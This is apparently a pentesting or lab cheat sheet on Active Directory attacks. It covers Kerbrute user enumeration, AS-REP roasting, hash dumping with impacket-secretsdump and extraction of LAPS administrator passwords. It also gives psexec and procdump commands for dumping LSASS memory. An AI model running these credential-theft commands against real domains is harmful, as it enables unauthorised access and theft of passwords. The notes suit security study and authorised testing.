# Active Directory
The domain controller

```whoami /priv``` can be used to check user privileges.

```net user``` can be used to check group memberships.

## Initial Foothold
### Kerberos
Kerberos is a key authentication service within Active Directory. It acts as a Key Distribution Center (KDC) and runs off of "tickets". A Ticket Granting Ticket (TGT) is a user authentication token issued by the KDC that is used to request access tokens from the Ticket Granting Service (TGS) for specific resources/systems joined to the domain.

Kerbrute can be used to brute force discovery of usernames with `userenum`. It is **not** recommended to brute force account credentials due to account lockout policies.

#### ASReproasting
ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means the account **does not** need to provide valid identification before requesting a Kerberos Ticket on the specified account.

## Privilege Escalation
### Dumping Secrets
We can use `impacket-secretsdump` to retrieve all the password hashes that this user has to offer.

If the current account has the unique permission that allows all Active Directory changes to be synced with the account, then we will be able to grab all password hashes in the Active Directory.

### LAPS
If the current user is part of the ```LAPS_Readers``` group we can use it to read and extract the Local Administrator password with
```powershell
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd
```

### LSAS.exe (Local Security Authority Subsystem Service)
**Note:** You must have enough permissions (system rights) to dump LSAS.exe and Credential Guard **cannot** be configured and running.

Check if Credential Guard is configured and running
```powershell
$DevGuard = Get-CimInstance –ClassName Win32_DeviceGuard –Namespace root\Microsoft\Windows\DeviceGuard
if ($DevGuard.SecurityServicesConfigured -contains 1) {"Credential Guard configured"}
if ($DevGuard.SecurityServicesRunning -contains 1) {"Credential Guard running"}
```

Create command prompt with system rights (Windows Defender will prevent process dump if you do not have system rights) and dump.
```powershell
psexec -i -s cmd
procdump -ma lsass.exe lsass.dmp
```
